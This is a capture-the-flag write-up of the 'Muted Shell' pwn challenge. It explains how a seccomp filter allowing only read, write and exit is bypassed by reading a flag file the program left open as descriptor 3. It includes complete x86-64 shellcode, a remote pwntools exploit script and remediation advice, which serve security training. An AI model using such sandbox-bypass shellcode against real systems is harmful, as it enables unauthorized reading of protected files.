# Muted Shell — Seccomp Bypass via Pre-Opened File Descriptor (PWN)

**Writeup by Obito Uchiha** **Team AKATSUKI**

**Category:** PWN **CTF:** Black Hat Training Labs (FlagYard) **Challenge:** Muted Shell (Easy) **Hint:** _"Can u read something without opening it?"_ **Flag:** `FlagY{efaf9958676b6a43eb6a1b96807d3fe5}`

---

## 1. Challenge Description

> can u read something without opening it?

We're given a PIE, 64-bit ELF binary that reads shellcode from the user, writes it into an executable memory region, and then jumps into it — a classic **shellcode injection** setup, but locked down with a **seccomp-bpf** syscall filter that activates _after_ the shellcode is loaded but _before_ it runs.

---

## 2. Binary Protections

```bash
$ checksec --file=./muted_shell
RELRO           STACK CANARY      NX            PIE
Full RELRO      No canary found   NX disabled   PIE enabled
```

|Protection|Status|Relevance|
|---|---|---|
|RELRO|Full|Irrelevant here — we never touch the GOT.|
|Canary|None|Irrelevant — no stack overflow needed.|
|**NX**|**Disabled**|Confirms the program intentionally maps **executable** memory for shellcode to run directly.|
|PIE|Enabled|Doesn't matter — we never need to leak or hardcode any binary/libc addresses.|

The interesting protection here isn't in `checksec` at all — it's the **seccomp filter** installed at runtime, visible only in the decompiled source.

---

## 3. Source Code Review

### `main()`

```c
bool main(void)
{
  code *__buf;

  setbuf(stdin,(char *)0x0);
  setbuf(stdout,(char *)0x0);
  setbuf(stderr,(char *)0x0);

  open("./flag", 0);                       // (1) flag opened, fd discarded
  __buf = mmap((void *)0x0,0x1000,7,0x22,-1,0);  // (2) RWX scratch memory
  if (__buf != (code *)0xffffffffffffffff) {
    puts("Send your shellcode:");
    read(0,__buf,0x100);                   // (3) shellcode read in (max 256 bytes)
    install_seccomp();                     // (4) syscall filter locked in
    (*__buf)();                            // (5) jump into shellcode
  }
  else {
    perror("mmap");
  }
  return __buf == (code *)0xffffffffffffffff;
}
```

Two details matter enormously here:

1. **`open("./flag", 0)` happens before `install_seccomp()`.** Its return value (a file descriptor) is never stored or used by the program — but the kernel still keeps that file open. Since `stdin`, `stdout`, and `stderr` already occupy file descriptors `0`, `1`, and `2`, this `open()` call is guaranteed to return **file descriptor `3`**.
2. **`install_seccomp()` runs only _after_ the shellcode is already loaded into memory**, and restricts syscalls only for what happens _from that point onward_ — i.e., inside our shellcode.

### `install_seccomp()`

The decompiled BPF program is hard to read directly, but translating the `local_58` / `local_50` filter structure back into `seccomp_rule_add`-style logic reveals an allow-list of exactly three syscalls:

| Syscall number | Name    |
| -------------- | ------- |
| `0`            | `read`  |
| `1`            | `write` |
| `60`           | `exit`  |

Any other syscall (critically, `open` = `2`, `openat` = `257`, `execve` = `59`) triggers the default seccomp action — the process is killed (`SIGKILL`), typically observed as a segmentation fault / silent death.

This is why a "normal" shellcode approach — `open("./flag")` followed by `read`/`write`, or spawning `/bin/sh` via `execve` — **cannot work**: both `open` and `execve` are outside the allow-list.

---

## 4. The Insight

The challenge hint — _"can u read something without opening it?"_ — is the key. We don't need to call `open()` in our shellcode at all, because **the flag file is already open**, sitting at **file descriptor 3**, opened by the program itself _before_ the seccomp filter was ever installed.

Since seccomp filters restrict _syscall numbers_, not _which file descriptor is passed as an argument_, `read(3, buf, len)` is completely legal under this filter — `read` is on the allow-list, and the filter has no concept of "you may not read from fd 3."

So the plan becomes:

```
read(3, buffer, N)    // read flag contents from the already-open fd
write(1, buffer, N)   // print it to stdout
exit(0)                // clean exit
```

All three syscalls used (`0`, `1`, `60`) are explicitly permitted.

---

## 5. Building the Shellcode

Using `pwntools`' inline assembler (`asm()`), we write raw x86-64 syscalls directly, using the current stack pointer region as scratch space to store the read data:

```python
from pwn import *

context.arch = 'amd64'

shellcode = asm("""
    /* read(3, rsp-0x100, 100) */
    mov rdi, 3
    mov rsi, rsp
    sub rsi, 0x100
    mov rdx, 100
    mov rax, 0
    syscall

    /* write(1, rsp-0x100, 100) */
    mov rdi, 1
    mov rsi, rsp
    sub rsi, 0x100
    mov rdx, 100
    mov rax, 1
    syscall

    /* exit(0) */
    mov rdi, 0
    mov rax, 60
    syscall
""")

print(len(shellcode))   # 82 bytes
```

**Why `rsp - 0x100` as the buffer?** The shellcode runs inside its own `mmap`-ed executable page and doesn't set up a traditional stack frame, but `rsp` still points to valid, writable stack memory at the time of the jump. Subtracting `0x100` moves well clear of the return address and any data the caller might still reference, giving us safe scratch space without needing a second `mmap` call.

**Size check:** the program only reads `0x100` (256) bytes of shellcode via `read(0, __buf, 0x100)`. Our shellcode compiles to **82 bytes**, comfortably under that limit.

---

## 6. Local Verification

```python
p = process('./muted_shell')
p.sendafter(b"Send your shellcode:", shellcode)
p.interactive()
```

**Output:**

```
FlagY{test_flag}
<leftover stack bytes...>
```

The local binary ships with a placeholder `FlagY{test_flag}` in its `./flag` file, and it printed immediately — confirming the fd-3 theory and the read/write shellcode logic both work correctly. The trailing garbage bytes are simply leftover stack memory beyond the actual flag's length, since we unconditionally `write()` a fixed 100 bytes regardless of how much `read()` actually filled in.

---

## 7. Exploiting the Remote Instance

With the technique confirmed locally, the only change needed is swapping `process()` for `remote()`:

```python
from pwn import *

context.arch = 'amd64'

shellcode = asm("""
    /* read(3, rsp-0x100, 100) */
    mov rdi, 3
    mov rsi, rsp
    sub rsi, 0x100
    mov rdx, 100
    mov rax, 0
    syscall

    /* write(1, rsp-0x100, 100) */
    mov rdi, 1
    mov rsi, rsp
    sub rsi, 0x100
    mov rdx, 100
    mov rax, 1
    syscall

    /* exit(0) */
    mov rdi, 0
    mov rax, 60
    syscall
""")

p = remote('tcp.flagyard.com', 30039)
p.sendafter(b"Send your shellcode:", shellcode)
p.interactive()
```

**Result:**

```
FlagY{efaf9958676b6a43eb6a1b96807d3fe5}
<leftover stack bytes...>
```

**Flag:** `FlagY{efaf9958676b6a43eb6a1b96807d3fe5}`

---

## 8. Root Cause & Remediation

**Root cause:** The application opens a sensitive file (`./flag`) **before** applying its seccomp sandbox, then hands full shellcode-execution capability to the user **after** the sandbox is in place. The sandbox restricts _syscall numbers_ but does nothing to revoke _already-open file descriptors_ — so any capability granted before `install_seccomp()` runs remains fully usable inside the sandboxed shellcode, as long as the syscalls needed to use it (`read`/`write`) are still allowed.

**General mitigations:**

- **Principle of least privilege in ordering:** sensitive resources (file descriptors, sockets, credentials) should be opened — or better, not opened at all — strictly _after_ all sandboxing is applied, or should be closed before untrusted code runs if they're no longer needed.
- **Close unused file descriptors** explicitly (`close(fd)`) once their purpose is served, rather than leaving them dangling for the lifetime of the process.
- When building seccomp allow-lists, consider that **syscall-level filtering alone does not scope access to specific file descriptors, paths, or arguments** — tools like `seccomp-bpf` can inspect syscall arguments for finer-grained filtering (e.g., restricting `read`/`write` to specific fd ranges) if that's the intended security boundary.
- Favor **closing stdio/extra fds** or using `O_CLOEXEC`-style hygiene, and audit what capabilities are implicitly inherited by any code that runs after sandbox initialization.

---

## 9. Summary

|Step|Detail|
|---|---|
|Vulnerability class|Sandboxing (seccomp) applied _after_ a sensitive resource was already opened|
|Sandbox in place|seccomp-bpf allow-list: `read` (0), `write` (1), `exit` (60) only|
|Key observation|`open("./flag", 0)` ran before the filter, silently leaving the flag open as fd 3|
|Blocked syscalls|`open`, `openat`, `execve` — any traditional "read a file" or "spawn a shell" approach fails|
|Exploit primitive|`read(3, buf, len)` + `write(1, buf, len)` — both syscalls explicitly allowed|
|Shellcode size|82 bytes (limit: 256 bytes)|
|Result|Flag contents read directly from the pre-opened fd and printed to stdout|

**Flag:** `FlagY{efaf9958676b6a43eb6a1b96807d3fe5}`

---

_Writeup by Obito Uchiha — Team AKATSUKI_
